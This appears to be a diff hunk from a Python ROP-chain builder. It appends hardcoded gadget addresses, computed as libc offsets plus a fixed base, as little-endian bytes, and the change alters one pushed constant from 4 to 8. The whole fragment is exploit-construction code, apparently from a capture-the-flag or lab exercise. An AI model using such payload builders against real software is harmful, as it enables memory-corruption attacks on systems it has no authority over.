@@ -390,7 +390,7 @@ class ROP:
         #sys.stdout.buffer.write((0x000f4834 + 0xb7dec000).to_bytes(4, byteorder='little'))  # 0x000f4834 : mov dword ptr [eax], edx ; ret 
         self.arr += (0x000f4834 + 0xb7dec000).to_bytes(4, byteorder='little')
         self.pop_register("edx", 0)
-        self.arr += (4).to_bytes(4, byteorder='little')
+        self.arr += (8).to_bytes(4, byteorder='little')
         self.arr += (0x00098fec + 0xb7dec000).to_bytes(4, byteorder='little')    #add dword ptr [eax], edx ; ret
         #sys.stdout.buffer.write((0x00098ffc + 0xb7dec000).to_bytes(4, byteorder='little'))  # 0x00098ffc : add dword ptr [eax], esp ; ret
         self.arr += (0x00098ffc + 0xb7dec000).to_bytes(4, byteorder='little')
